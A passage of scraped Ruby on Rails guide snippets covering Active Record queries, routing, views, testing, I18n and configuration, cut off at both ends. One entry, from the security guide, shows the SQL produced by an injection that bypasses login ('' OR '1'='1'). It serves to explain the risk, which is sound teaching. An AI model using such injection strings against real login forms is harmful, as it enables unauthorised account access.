conditions to create an `AND` condition. It filters for customers who have both the last name 'Smith' AND an order count in [1, 3, 5].\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_75\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(last_name: \"Smith\").where(orders_count: [1, 3, 5])\n```\n\n----------------------------------------\n\nTITLE: Edit Product View - ERB\nDESCRIPTION: This ERB snippet renders the `_form` partial and passes the `@product` instance variable as the `product` local variable to the partial.  It also includes a link to cancel editing the product.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_63\n\nLANGUAGE: erb\nCODE:\n```\n<h1>Edit product</h1>\n\n<%= render \"form\", product: @product %>\n<%= link_to \"Cancel\", @product %>\n```\n\n----------------------------------------\n\nTITLE: Running a Single Test by Name in Bash (Action Mailer)\nDESCRIPTION: Executes a single test case identified by its name (`test_explicit_class_layout`) within a specified test file (`test/mail_layout_test.rb`) using the `-n` option. This is useful for debugging a specific failing test.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\n$ cd actionmailer\n$ bin/test test/mail_layout_test.rb -n test_explicit_class_layout\n```\n\n----------------------------------------\n\nTITLE: Eager Loading Multiple Associations (Array) in Rails\nDESCRIPTION: This code shows how to eager load multiple associations using an array with the `includes` method. It loads all customers along with their associated orders and reviews in a single query.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_151\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.includes(:orders, :reviews)\n```\n\n----------------------------------------\n\nTITLE: HTML Output of Special Formatting Form Helpers\nDESCRIPTION: This snippet shows the HTML output generated by the special formatting related form helpers in Rails. It generates HTML input tags with `type='password'`, `type='email'`, `type='tel'`, and `type='url'`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_12\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"password\" name=\"password\" id=\"password\">\n<input type=\"email\" name=\"address\" id=\"address\">\n<input type=\"tel\" name=\"phone\" id=\"phone\">\n<input type=\"url\" name=\"homepage\" id=\"homepage\">\n```\n\n----------------------------------------\n\nTITLE: Rendering a View and Accessing Nokogiri Node\nDESCRIPTION: This code renders a view partial and then accesses the rendered content as a Nokogiri XML node. It then performs assertions on the node's text content and attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_83\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"renders a link to itself\" do\n  article = Article.create! title: \"Hello, world\"\n\n  render \"articles/article\", article: article\n  anchor = document_root_element.at(\"a\")\n\n  assert_equal article.name, anchor.text\n  assert_equal article_url(article), anchor[\"href\"]\nend\n```\n\n----------------------------------------\n\nTITLE: Using Ruby's Pattern Matching with Nokogiri\nDESCRIPTION: This code demonstrates how to use Ruby's pattern matching with a Nokogiri XML node to assert the content and attributes of an HTML element.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_84\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"renders a link to itself\" do\n  article = Article.create! title: \"Hello, world\"\n\n  render \"articles/article\", article: article\n  anchor = document_root_element.at(\"a\")\n  url = article_url(article)\n\n  assert_pattern do\n    anchor => { content: \"Hello, world\", attributes: [{ name: \"href\", value: url }] }\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Switching Primary Database Cluster Connection\nDESCRIPTION: Example showing how to switch connections specifically for the primary database cluster using ApplicationRecord, which affects only the primary database while leaving other database connections unchanged.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nApplicationRecord.connected_to(role: :reading, shard: :shard_one) do\n  Person.first # Reads from primary_shard_one_replica.\n  Dog.first # Reads from animals_primary.\nend\n```\n\n----------------------------------------\n\nTITLE: Equivalent Translation Lookups in Ruby\nDESCRIPTION: Demonstrates four equivalent ways to look up the same translation (:short date format) using different I18n.t method variations with different scoping approaches.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\nI18n.t \"date.formats.short\"\nI18n.t \"formats.short\", scope: :date\nI18n.t :short, scope: \"date.formats\"\nI18n.t :short, scope: [:date, :formats]\n```\n\n----------------------------------------\n\nTITLE: Overriding Resources Helper with :as (Ruby)\nDESCRIPTION: Overrides the default routing helper name defined by `resources` using `as`.  A custom route is defined *before* the resources definition to ensure it takes precedence, mapping the username to the `show` action of the `UsersController`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nget \":username\", to: \"users#show\", as: :user\nresources :users\n```\n\n----------------------------------------\n\nTITLE: Rendering Partial with Unknown Local Raises Error\nDESCRIPTION: Shows that rendering a partial with a local variable not specified in the `local:` signature will raise an exception. This enforces that only explicitly declared locals are allowed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nrender \"messages/message\", unknown_local: \"will raise\"\n# => ActionView::Template::Error: unknown local: :unknown_local for app/views/messages/_message.html.erb\n```\n\n----------------------------------------\n\nTITLE: Resourceful Route with ID Constraints in Rails\nDESCRIPTION: This code snippet shows how to add constraints to the `:id` parameter in a resourceful route using the `:constraints` option. In this case, it constrains the `id` to be a string matching the regular expression `/[A-Z][A-Z][0-9]+/`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos, constraints: { id: /[A-Z][A-Z][0-9]+/ }\n```\n\n----------------------------------------\n\nTITLE: Redirection with a Block (Ruby)\nDESCRIPTION: Redirects requests using a block that receives the symbolized path parameters and the request object. This allows for dynamic generation of the redirect path based on the request.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/stories/:name\", to: redirect { |path_params, req| \"/articles/#{path_params[:name].pluralize}\" }\nget \"/stories\", to: redirect { |path_params, req| \"/articles/#{req.subdomain}\" }\n```\n\n----------------------------------------\n\nTITLE: Rails Create Article Test Ruby\nDESCRIPTION: Presents a test case for creating an article, including asserting the difference in the Article count and redirecting to the article path. Requires the body and title fields to be supplied in parameters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"should create article\" do\n  assert_difference(\"Article.count\") do\n    post articles_url, params: { article: { body: \"Rails is awesome!\", title: \"Hello Rails\" } }\n  end\n\n  assert_redirected_to article_path(Article.last)\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Base Errors in Rails Models\nDESCRIPTION: This snippet demonstrates how to add errors related to the entire object rather than a specific attribute. It shows using :base as the attribute name when adding errors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_71\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validate do |person|\n    errors.add :base, :invalid, message: \"This person is invalid because ...\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Applying a Default Scope in Rails\nDESCRIPTION: Illustrates applying a default scope to a model. A default scope is automatically applied to all queries on the model, filtering results based on the specified conditions. This example shows how to exclude out-of-print books by default.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_165\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  default_scope { where(out_of_print: false) }\nend\n```\n\n----------------------------------------\n\nTITLE: Permitting Arbitrary Data Hashes in Rails\nDESCRIPTION: This example shows how to permit a product name attribute and an entire data hash associated with the product in Rails. This permits the product name explicitly and allows any data within the 'data' hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\ndef product_params\n  params.expect(product: [ :name, data: {} ])\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Content-Security-Policy Nonce Generation in Ruby on Rails\nDESCRIPTION: This snippet shows how to configure nonce generation for Content-Security-Policy in Rails, which provides better security than 'unsafe-inline' when implementing CSP on existing code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_72\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/content_security_policy.rb\nRails.application.config.content_security_policy do |policy|\n  policy.script_src :self, :https\nend\n\nRails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }\n```\n\n----------------------------------------\n\nTITLE: Configuring Layout in Rails Controller (Ruby)\nDESCRIPTION: Demonstrates how to specify a layout for a specific action in a Rails controller. The example shows using 'single_car' layout for the 'show' action, while other actions will use the default layout.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nclass CarsController\n  layout 'single_car', :only => :show\nend\n```\n\n----------------------------------------\n\nTITLE: Running Active Record Tests for SQLite3 in Bash\nDESCRIPTION: Executes the Active Record test suite specifically using the SQLite3 adapter via the `test:sqlite3` Rake task within the `activerecord` directory. This does not require separate database setup.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_24\n\nLANGUAGE: bash\nCODE:\n```\n$ cd activerecord\n$ bundle exec rake test:sqlite3\n```\n\n----------------------------------------\n\nTITLE: Using content_for Method in Views\nDESCRIPTION: This code snippet demonstrates how to use the `content_for` method to insert content into a named `yield` block in a layout. The content within the `content_for` block will be rendered in the corresponding `yield` block in the layout.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_67\n\nLANGUAGE: html\nCODE:\n```\n<% content_for :head do %>\n  <title>A simple page</title>\n<% end %>\n\n<p>Hello, Rails!</p>\n```\n\n----------------------------------------\n\nTITLE: Calculating Sum of a Field in Rails\nDESCRIPTION: This snippet shows how to use the `sum` method in Rails to calculate the sum of a specific field across all records in a table. The `Order` class is used as an example, and the `subtotal` column is summed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_208\n\nLANGUAGE: ruby\nCODE:\n```\nOrder.sum(\"subtotal\")\n```\n\n----------------------------------------\n\nTITLE: Splitting Rails Routes File with `draw` (Ruby)\nDESCRIPTION: Demonstrates splitting a large `config/routes.rb` file into multiple smaller files using the `draw` macro. The `draw` macro loads a separate route file located in the `config/routes` directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_91\n\nLANGUAGE: ruby\nCODE:\n```\n# config/routes.rb\n\nRails.application.routes.draw do\n  get \"foo\", to: \"foo#bar\"\n\n  draw(:admin) # Will load another route file located in `config/routes/admin.rb`\nend\n```\n\n----------------------------------------\n\nTITLE: Example of Bad vs. Good Code Examples in Documentation\nDESCRIPTION: Shows how to present modern, recommended Rails idioms in documentation rather than older approaches. The example demonstrates preferred ActiveRecord query methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\n# BAD\n# Book.where('name = ?', \"Where the Wild Things Are\")\n# Book.where('year_published < ?', 50.years.ago)\n\n# GOOD\n# Book.where(name: \"Where the Wild Things Are\")\n# Book.where(year_published: ...50.years.ago)\n```\n\n----------------------------------------\n\nTITLE: Generated ERB View from Custom Scaffold Template\nDESCRIPTION: Displays the content of the generated `app/views/posts/index.html.erb` file. This output reflects the structure defined in the custom ERB generator template, including the correctly rendered `<% @posts.count %>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_15\n\nLANGUAGE: erb\nCODE:\n```\n<% @posts.count %> Posts\n```\n\n----------------------------------------\n\nTITLE: Overriding belongs_to Required by Default on Specific Models\nDESCRIPTION: Demonstrates how to override the belongs_to_required_by_default setting on individual model classes, allowing gradual migration to the new behavior in Rails 5.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  # model is not yet ready to have its association required by default\n\n  self.belongs_to_required_by_default = false\n  belongs_to(:author)\nend\n\nclass Car < ApplicationRecord\n  # model is ready to have its association required by default\n\n  self.belongs_to_required_by_default = true\n  belongs_to(:pilot)\nend\n```\n\n----------------------------------------\n\nTITLE: String Concatenation with html_safe\nDESCRIPTION: This code demonstrates string concatenation with `html_safe` strings. When concatenating a safe string with an unsafe string, the unsafe string is escaped. When concatenating two safe strings, the result is a safe string with the strings directly appended.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\n\"\".html_safe + \"<\" # => \"&lt;\"\n\n\"\".html_safe + \"<\".html_safe # => \"<\"\n```\n\n----------------------------------------\n\nTITLE: Changing an Existing Table\nDESCRIPTION: This snippet showcases how to modify an existing table using the `change_table` method. It removes columns, adds a new column with an index, and renames an existing column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\nchange_table :products do |t|\n  t.remove :description, :name\n  t.string :part_number\n  t.index :part_number\n  t.rename :upccode, :upc_code\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Image Tag with Size in Rails\nDESCRIPTION: This code snippet demonstrates how to use the `image_tag` helper with a size tag in Rails to generate an HTML `<img>` tag. It sets the `width` and `height` attributes of the `<img>` tag to 50 and 20, respectively.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_57\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag \"home.gif\", size: \"50x20\" %>\n```\n\n----------------------------------------\n\nTITLE: Creating Migration for Self-Join Employee Table in Rails\nDESCRIPTION: Defines a migration to create the employees table with a manager_id foreign key that references the same table, supporting the self-join relationship.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_68\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateEmployees < ActiveRecord::Migration[8.1]\n  def change\n    create_table :employees do |t|\n      # Add a belongs_to reference to the manager, which is an employee.\n      t.belongs_to :manager, foreign_key: { to_table: :employees }\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining a POST Route in Rails\nDESCRIPTION: This Ruby code snippet defines a POST route, mapping POST requests to the `/products` path to the `create` action of the `ProductsController`. This route is typically used to handle form submissions for creating new products.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\npost \"/products\", to: \"products#create\"\n```\n\n----------------------------------------\n\nTITLE: Implementing Halted Callback Hook in Ruby on Rails\nDESCRIPTION: This Ruby code shows how to implement the halted_callback_hook method in a Rails model, which now receives two arguments instead of one in Rails 6.1.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  before_save { throw(:abort) }\n  before_create { throw(:abort) }\n\n  def halted_callback_hook(filter, callback_name) # => This method now accepts 2 arguments instead of 1\n    Rails.logger.info(\"Book couldn't be #{callback_name}d\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Linking to New Product Form (ERB)\nDESCRIPTION: This ERB snippet adds a link to the new product form to the `index.html.erb` view, using the `new_product_path` helper to generate the correct URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_53\n\nLANGUAGE: erb\nCODE:\n```\n<h1>Products</h1>\n\n<%= link_to \"New product\", new_product_path %>\n\n<div id=\"products\">\n  <% @products.each do |product| %>\n    <div>\n      <%= link_to product.name, product_path(product.id) %>\n    </div>\n  <% end %>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Defining multiple resources at once\nDESCRIPTION: This snippet shows how to define routes for multiple resources using a single `resources` call. This is a shortcut for defining each resource individually and reduces the amount of code needed in the `config/routes.rb` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos, :books, :videos\n```\n\n----------------------------------------\n\nTITLE: Explicitly Eager Loading in Tests\nDESCRIPTION: This code demonstrates how to explicitly call `Rails.application.eager_load!` within a test to ensure all files are loaded without errors, useful if a CI environment is not available.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_118\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ZeitwerkComplianceTest < ActiveSupport::TestCase\n  test \"eager loads all files without errors\" do\n    assert_nothing_raised { Rails.application.eager_load! }\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering Partial with Object Option\nDESCRIPTION: This code demonstrates rendering a partial named `customer` and passing the `@new_customer` object to it using the `:object` option. Inside the `_customer` partial, the `@new_customer` object will be accessible via the local variable `customer`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_82\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"customer\", object: @new_customer %>\n```\n\n----------------------------------------\n\nTITLE: Creating a Null Relation in Active Record (Ruby)\nDESCRIPTION: This snippet demonstrates how to use the `none` method to return a chainable relation with no records. This is useful when you need a chainable response that could return zero results.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_129\n\nLANGUAGE: ruby\nCODE:\n```\nBook.none # returns an empty Relation and fires no queries.\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# The highlighted_reviews method below is expected to always return a Relation.\nBook.first.highlighted_reviews.average(:rating)\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book\n  # Returns reviews if there are at least 5,\n  # else consider this as non-reviewed book\n  def highlighted_reviews\n    if reviews.count >= 5\n      reviews\n    else\n      Review.none # Does not meet minimum threshold yet\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Excluding healthcheck path from host checking in Rails\nDESCRIPTION: This code snippet demonstrates how to exclude requests to the '/healthcheck/' path from Rails host authorization checks. It configures the Rails application to bypass host checking for requests containing 'healthcheck' in their path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.host_authorization = {\n  exclude: ->(request) { request.path.include?(\"healthcheck\") }\n}\n```\n\n----------------------------------------\n\nTITLE: Storing Translations in YAML Format\nDESCRIPTION: Example of how to store translations in YAML format, equivalent to the Ruby Hash example. Shows the locale key (pt) with nested namespace (foo) and translation key (bar).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_44\n\nLANGUAGE: yaml\nCODE:\n```\npt:\n  foo:\n    bar: baz\n```\n\n----------------------------------------\n\nTITLE: Creating a Model with Attachments in Rails Controller\nDESCRIPTION: Demonstrates how to create a model with file attachments in a Rails controller. The controller accepts message parameters including multiple image attachments and handles the creation process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nclass MessagesController < ApplicationController\n  def create\n    message = Message.create!(message_params)\n    redirect_to message\n  end\n\n  private\n    def message_params\n      params.expect(message: [ :title, :content, images: [] ])\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Using respond_with in Rails Controllers with responders gem\nDESCRIPTION: Example of a Rails controller using the class-level respond_to and respond_with methods, which were extracted to the responders gem in Rails 4.2. This requires adding the responders gem to your Gemfile.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_63\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/users_controller.rb\n\nclass UsersController < ApplicationController\n  respond_to :html, :json\n\n  def show\n    @user = User.find(params[:id])\n    respond_with @user\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Lint::Tests Usage\nDESCRIPTION: This snippet demonstrates how to include `ActiveModel::Lint::Tests` in a test case to verify compliance with the Active Model API. It sets up a `@model` instance for the tests to run against.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass PersonTest < ActiveSupport::TestCase\n  include ActiveModel::Lint::Tests\n\n  setup do\n    @model = Person.new\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Rails Application with Dev Container\nDESCRIPTION: Commands to generate a new Rails application with development container configuration or add dev container to existing applications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_2_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new myapp --devcontainer\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ rails devcontainer\n```\n\n----------------------------------------\n\nTITLE: Creating a New Rails App\nDESCRIPTION: This command generates the foundation of a new Rails application named 'store'. It initializes the directory structure and sets up the basic configuration. It requires Rails to be installed and accessible in the system's PATH. The Rails application will be created in the current directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new store\n```\n\n----------------------------------------\n\nTITLE: Using Where with Hash Conditions in Association Scopes\nDESCRIPTION: Shows how to use the where method with a hash condition in an association scope. This approach offers automatic scoping when creating new records through the association.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_118\n\nLANGUAGE: ruby\nCODE:\n```\nclass Parts < ApplicationRecord\n  has_and_belongs_to_many :assemblies,\n    -> { where factory: \"Seattle\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Querying STI Records\nDESCRIPTION: Shows the SQL query that Rails generates when retrieving records using Single Table Inheritance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_77\n\nLANGUAGE: sql\nCODE:\n```\nSELECT \"vehicles\".* FROM \"vehicles\" WHERE \"vehicles\".\"type\" IN ('Car')\n```\n\n----------------------------------------\n\nTITLE: Overriding Naming Conventions in ActiveRecord\nDESCRIPTION: This snippet demonstrates how to override the default table name and primary key for an ActiveRecord model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  self.table_name = \"my_books\"\n  self.primary_key = \"book_id\"\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Logger in Ruby\nDESCRIPTION: This snippet configures the logger used by Active Storage. It sets the `config.active_storage.logger` to an instance of `ActiveSupport::Logger`, directing log output to STDOUT. This can be useful for debugging Active Storage operations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_77\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_storage.logger = ActiveSupport::Logger.new(STDOUT)\n```\n\n----------------------------------------\n\nTITLE: Automated Debugging Workflow Execution\nDESCRIPTION: Shows the result of running the automated debugging workflow with chained commands. The debugger sets a catch breakpoint and then automatically displays the backtrace when the exception is caught, without requiring manual intervention.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\n(rdbg:binding.break) catch ActiveRecord::RecordInvalid do: bt 10\n#0  BP - Catch  \"ActiveRecord::RecordInvalid\"\n[75, 84] in ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb\n    75|     def default_validation_context\n    76|       new_record? ? :create : :update\n    77|     end\n    78|\n    79|     def raise_validation_error\n=>  80|       raise(RecordInvalid.new(self))\n    81|     end\n    82|\n    83|     def perform_validations(options = {})\n    84|       options[:validate] == false || valid?(options[:context])\n=>#0    ActiveRecord::Validations#raise_validation_error at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:80\n  #1    ActiveRecord::Validations#save!(options={}) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:53\n  # and 88 frames (use `bt' command for all frames)\n```\n\n----------------------------------------\n\nTITLE: Ruby Configuration Examples\nDESCRIPTION: Ruby configuration code for excluding paths from asset digestion and setting up file watchers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.assets.excluded_paths = [Rails.root.join(\"app/assets/stylesheets\")]\n```\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.file_watcher = ActiveSupport::EventedFileUpdateChecker\n```\n\n----------------------------------------\n\nTITLE: Setting Far-Future Expiration Headers in NGINX (NGINX)\nDESCRIPTION: NGINX configuration block for adding long-term expiry headers and disabling ETags for the /assets/ location. This lets most browsers cache assets for 1 year, improving asset delivery efficiency from the server. Suitable for production Rails applications whose assets are served via NGINX.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_14\n\nLANGUAGE: nginx\nCODE:\n```\nlocation ~ ^/assets/ {\n  expires 1y;\n  add_header Cache-Control public;\n\n  add_header ETag \"\";\n}\n```\n\n----------------------------------------\n\nTITLE: SQL query for filtered data from multiple tables\nDESCRIPTION: This SQL query is generated by the Active Record query. It selects the customer ID and last name from the `customers` table and the review body from the `reviews` table, joining the tables on the `customer_id` and filtering the results to include reviews created in the last week.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_182\n\nLANGUAGE: sql\nCODE:\n```\nSELECT customers.id, customers.last_name, reviews.body\nFROM customers\nINNER JOIN reviews\n  ON reviews.customer_id = customers.id\nWHERE (reviews.created_at > '2019-01-08')\n```\n\n----------------------------------------\n\nTITLE: Disabling I18n Missing Translation Errors in Rails 7.1\nDESCRIPTION: Configuration example showing how to disable the new behavior where I18n raises on missing translations by setting config.i18n.raise_on_missing_translations = false.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\n# with config.i18n.raise_on_missing_translations = false\n\n# in a view or controller:\nt(\"missing.key\") # didn't raise in 7.0, doesn't raise in 7.1\nI18n.t(\"missing.key\") # didn't raise in 7.0, doesn't raise in 7.1\n\n# anywhere:\nI18n.t(\"missing.key\") # didn't raise in 7.0, doesn't raise in 7.1\n```\n\n----------------------------------------\n\nTITLE: Setting Locale from Subdomain in Ruby on Rails\nDESCRIPTION: Extracts the locale from the subdomain of the request. This method needs to be used in conjunction with the switch_locale method and requires additional configuration in the development environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\n# Get locale code from request subdomain (like http://it.application.local:3000)\n# You have to put something like:\n#   127.0.0.1 it.application.local\n# in your /etc/hosts file to try this out locally\n#\n# Additionally, you need to add the following configuration to your config/environments/development.rb:\n#   config.hosts << 'it.application.local:3000'\ndef extract_locale_from_subdomain\n  parsed_locale = request.subdomains.first\n  I18n.available_locales.map(&:to_s).include?(parsed_locale) ? parsed_locale : nil\nend\n```\n\n----------------------------------------\n\nTITLE: Using benchmark Helper in Rails\nDESCRIPTION: The benchmark helper measures the execution time of code blocks. It's useful for identifying potential bottlenecks by wrapping expensive operations to get timing measurements in the application log.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_43\n\nLANGUAGE: html+erb\nCODE:\n```\n<% benchmark \"Process data files\" do %>\n  <%= expensive_files_operation %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Setting I18n fallbacks to true in Rails\nDESCRIPTION: Sets the `config.i18n.fallbacks` option to `true`, enabling the default locale as the fallback for missing translations.  This means if a translation is not found in the current locale, it will look in the default locale.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.i18n.fallbacks = true\n```\n\n----------------------------------------\n\nTITLE: Custom Assertion Message (Ruby)\nDESCRIPTION: This example shows how to add a custom message to an assertion. If the assertion fails, this message will be displayed in the test output, making it easier to understand the reason for the failure. This enhances test readability.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_8\n\nLANGUAGE: Ruby\nCODE:\n```\ntest \"should not save article without title\" do\n  article = Article.new\n  assert_not article.save, \"Saved the article without a title\"\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Authentication Bypass Result\nDESCRIPTION: The resulting SQL query after an attacker attempts to bypass authentication through SQL injection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_33\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for deliver.action_mailer in Ruby\nDESCRIPTION: This example payload corresponds to the `deliver.action_mailer` event, triggered when an email delivery is performed. The Ruby hash contains details such as the `:mailer` class name, `:message_id`, `:subject`, recipient addresses (`:to`, `:from`, `:bcc`, `:cc`), `:date`, the encoded `:mail` content, and the `:perform_deliveries` boolean flag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_19\n\nLANGUAGE: 